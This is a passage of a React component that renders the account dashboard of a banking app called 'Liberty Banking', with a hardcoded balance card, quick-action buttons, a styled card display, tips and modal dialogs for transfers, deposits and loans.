              color: '#fff', padding: '8px 16px', borderRadius: 8, fontWeight: 700,
              fontSize: 13, cursor: 'pointer', whiteSpace: 'nowrap',
              WebkitTapHighlightColor: 'transparent', touchAction: 'manipulation',
            }}>Sign Out</button>
          </div>
        </div>
      </nav>

      <div className="db-page" style={{ maxWidth: 1100, margin: '0 auto', padding: '28px 24px' }}>

        {/* ─── BALANCE CARD ─── */}
        <div className="db-balance-card" style={{
          background: 'linear-gradient(135deg, #0a2240 0%, #0f3060 50%, #1a4080 100%)',
          borderRadius: 22, padding: '32px 36px', color: '#fff', marginBottom: 28,
          boxShadow: '0 16px 48px rgba(10,34,64,0.35)',
          display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 16,
        }}>
          <div>
            <div style={{ fontSize: 12, color: 'rgba(200,220,255,0.75)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Checkings Account
            </div>
            <div style={{ fontSize: 'clamp(36px, 5vw, 50px)', fontWeight: 900, color: '#d4af37', lineHeight: 1 }}>
              $4,000.00
            </div>
            <div style={{ fontSize: 14, color: 'rgba(200,220,255,0.8)', marginTop: 10, letterSpacing: 3 }}>
              •••• •••• •••• {ACCOUNT.cardLast4}
            </div>
          </div>
          <div className="db-balance-right" style={{ textAlign: 'right' }}>
            <div style={{ fontSize: 11, color: 'rgba(200,220,255,0.6)', marginBottom: 4 }}></div>
            <div style={{ fontSize: 24, fontWeight: 800 }}></div>
            <div style={{
              marginTop: 10, background: 'rgba(212,175,55,0.2)', border: '1px solid #d4af37',
              color: '#d4af37', padding: '5px 14px', borderRadius: 999, fontSize: 12, fontWeight: 700, display: 'inline-block',
            }}>Available balance</div>
          </div>
        </div>

        {/* ─── QUICK ACTIONS ─── */}
        <div style={{ marginBottom: 28 }}>
          <h2 style={{ fontSize: 19, fontWeight: 800, color: '#0a2240', marginBottom: 16 }}>Quick Actions</h2>
          <div className="db-actions-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(130px, 1fr))', gap: 12 }}>
            {quickActions.map(({ id, icon, label, color }) => (
              <button
                key={id}
                onClick={() => id !== 'beneficiary' && open(id)}
                style={{
                  background: '#fff', border: '1.5px solid #e8ecf0', borderRadius: 14,
                  padding: '18px 10px', cursor: id === 'beneficiary' ? 'default' : 'pointer',
                  display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
                  boxShadow: '0 2px 8px rgba(0,0,0,0.04)', transition: 'transform 0.15s, box-shadow 0.15s',
                  opacity: id === 'beneficiary' ? 0.55 : 1,
                  WebkitTapHighlightColor: 'transparent', touchAction: 'manipulation',
                }}
                onMouseEnter={e => { if (id !== 'beneficiary') { e.currentTarget.style.transform = 'translateY(-3px)'; e.currentTarget.style.boxShadow = '0 8px 24px rgba(0,0,0,0.12)'; } }}
                onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = '0 2px 8px rgba(0,0,0,0.04)'; }}
              >
                <div style={{ width: 46, height: 46, borderRadius: 13, background: color, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 21 }}>{icon}</div>
                <span style={{ fontSize: 12, fontWeight: 700, color: '#0a2240', textAlign: 'center', lineHeight: 1.3 }}>{label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* ─── CREDIT CARD ─── */}
        <div style={{ marginBottom: 28 }}>
          <h2 style={{ fontSize: 19, fontWeight: 800, color: '#0a2240', marginBottom: 16 }}>My Card</h2>
          <div style={{
            background: 'linear-gradient(135deg, #0a2240 0%, #1a5080 50%, #0f3060 100%)',
            borderRadius: 20, padding: '28px 32px', color: '#fff', maxWidth: 400,
            boxShadow: '0 16px 48px rgba(10,34,64,0.35)', position: 'relative', overflow: 'hidden',
          }}>
            <div style={{ position: 'absolute', top: -28, right: -28, width: 110, height: 110, borderRadius: '50%', background: 'rgba(255,255,255,0.05)' }} />
            <div style={{ position: 'absolute', bottom: -36, left: -16, width: 140, height: 140, borderRadius: '50%', background: 'rgba(255,255,255,0.04)' }} />
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 28 }}>
              <div>
                <div style={{ fontSize: 10, color: 'rgba(200,220,255,0.7)', letterSpacing: 3, textTransform: 'uppercase' }}>Liberty Banking</div>
                <div style={{ fontSize: 15, fontWeight: 800, marginTop: 2 }}>Checkings Account</div>
              </div>
              <div style={{ fontSize: 28 }}>🏛</div>
            </div>
            <div style={{ width: 40, height: 28, background: 'linear-gradient(135deg, #d4af37, #f0d060)', borderRadius: 5, marginBottom: 18 }} />
            <div style={{ fontSize: 18, letterSpacing: 4, fontWeight: 700, marginBottom: 18, color: '#e0e8ff' }}>
              •••• &nbsp; •••• &nbsp; •••• &nbsp; {ACCOUNT.cardLast4}
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 12 }}>
              <div>
                <div style={{ color: 'rgba(200,220,255,0.6)', fontSize: 9, letterSpacing: 1, marginBottom: 2 }}>CARD HOLDER</div>
                <div style={{ fontWeight: 700 }}>Account Holder</div>
              </div>
              <div>
                <div style={{ color: 'rgba(200,220,255,0.6)', fontSize: 9, letterSpacing: 1, marginBottom: 2 }}>EXPIRES</div>
                <div style={{ fontWeight: 700 }}>12/28</div>
              </div>
            </div>
          </div>
        </div>

        {/* ─── TIPS ─── */}
        <div>
          <h2 style={{ fontSize: 19, fontWeight: 800, color: '#0a2240', marginBottom: 16 }}>Tips & Features</h2>
          <div className="db-tips-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(230px, 1fr))', gap: 14 }}>
            {tips.map(({ icon, title, desc }) => (
              <div key={title} style={{
                background: '#fff', border: '1.5px solid #e8ecf0', borderRadius: 16, padding: 22,
                boxShadow: '0 2px 8px rgba(0,0,0,0.04)', display: 'flex', gap: 14, alignItems: 'flex-start',
              }}>
                <div style={{ background: '#0a2240', width: 42, height: 42, borderRadius: 12, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 20 }}>{icon}</div>
                <div>
                  <div style={{ fontWeight: 800, color: '#0a2240', marginBottom: 5, fontSize: 14 }}>{title}</div>
                  <div style={{ color: '#666', fontSize: 13, lineHeight: 1.7 }}>{desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ─── MODALS ─── */}
      <TransferModal open={openModal === 'wire'}      onClose={close} title="Wire Transfer" />
      <TransferModal open={openModal === 'local'}     onClose={close} title="Local Transfer" />
      <TransferModal open={openModal === 'internal'}  onClose={close} title="Internal Transfer" />
      <PayBillsModal open={openModal === 'bills'}     onClose={close} />
      <AlertsModal   open={openModal === 'alerts'}    onClose={close} />
      <SupportModal  open={openModal === 'support'}   onClose={close} />

      <GenericModal open={openModal === 'carddeposit'} onClose={close} title="Card Deposit" icon="💳"
        desc="Deposit funds instantly using your debit or credit card. Link your external card to Liberty Banking and transfer funds in seconds. Powered by Plaid®." />
      <GenericModal open={openModal === 'checkdeposit'} onClose={close} title="Check Deposit" icon="🖊"
        desc="Deposit a paper check from anywhere using the Liberty Banking mobile app. Simply take a photo of both sides. Funds typically available within 1–2 business days." />
      <GenericModal open={openModal === 'loans'} onClose={close} title="Loans" icon="🏠"
        desc="Explore personal loans, auto loans, and home mortgages at competitive rates with flexible terms. Speak with a loan advisor today at 1-800-LIBERTY." />
      <GenericModal open={openModal === 'investment'} onClose={close} title="Investment Portal" icon="📈"
        desc="Grow your wealth with Liberty Banking's investment services. Access managed portfolios, ETFs, mutual funds, and retirement accounts managed by certified financial advisors." />

      <ProfileModal open={showProfile} onClose={() => setShowProfile(false)} />
    </div>
  );
}